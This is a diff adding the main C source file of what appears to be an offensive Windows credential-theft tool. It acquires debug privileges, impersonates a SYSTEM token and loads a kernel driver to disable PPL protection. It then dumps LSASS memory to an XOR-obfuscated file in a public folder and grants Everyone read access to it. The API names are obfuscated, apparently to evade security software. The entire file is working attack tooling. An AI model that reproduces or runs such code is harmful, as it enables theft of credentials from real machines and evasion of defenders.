@@ -1,0 +1,85 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include "api.h"
+#include "defs.h"
+#include "driver.h"
+#include "dump.h"
+#include "engine.h"
+#include "logger.h"
+#include "memory.h"
+#include "token.h"
+#include "utils.h"
+
+int main(void) {
+  // Initialize logger
+  if (!init_logger("C:\\Users\\Public\\log.txt")) {
+    // Fallback or silent failure if logger can't be created
+  }
+
+  log_info("Initializing Syscall Engine...");
+  if (!InitEngine()) {
+    log_error("Engine initialization failed.");
+    return 1;
+  }
+
+  // Resolve required API functions
+  if (!ResolveAllApis()) {
+    log_error("Failed to resolve required APIs.");
+    return 1;
+  }
+
+  // Get SeDebugPrivilege
+  if (!EnableENCPVG(SE_DEBUG_ENC)) {
+    log_error("Failed to acquire needed privileges.");
+    // return 1;
+  }
+
+  // Impersonate SYSTEM
+  HANDLE hSystemToken = NULL;
+  if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
+    log_error("Failed to duplicate SYSTEM token.");
+    return 1;
+  }
+
+  if (!pIMP(hSystemToken)) {
+    log_error("ImpersonateLoggedOnUser failed.");
+    return 1;
+  }
+
+  if (!pSTT(NULL, hSystemToken)) {
+    log_error("SetThreadToken failed.");
+    return 1;
+  }
+
+  log_info("Running as SYSTEM.");
+
+  // Load driver and disable PPL
+  if (LoadAndStartDriver() != 0) {
+    log_error("Failed to load driver.");
+    return 1;
+  }
+
+  disablePPL();
+
+  // Clone LSASS and create XOR'd dump
+  if (!DumpAndXorLsass("C:\\Users\\Public\\doppelganger.dmp", XOR_KEY,
+                       key_len)) {
+    log_error("Failed to dump and XOR LSASS.");
+    StopAndUnloadDriver(DRIVER_NAME);
+    return 1;
+  }
+
+  restorePPL();
+
+  // Set GENERIC_READ permissions to "Everyone"
+  if (!SetFileGenericReadAccess("C:\\Users\\Public\\doppelganger.dmp")) {
+    log_error("Could not set GENERIC_READ permissions for Everyone.");
+  }
+
+  // Unload the driver
+  StopAndUnloadDriver(DRIVER_NAME);
+
+  // Done
+  log_info("Execution completed successfully.");
+  close_logger();
+  return 0;
+}
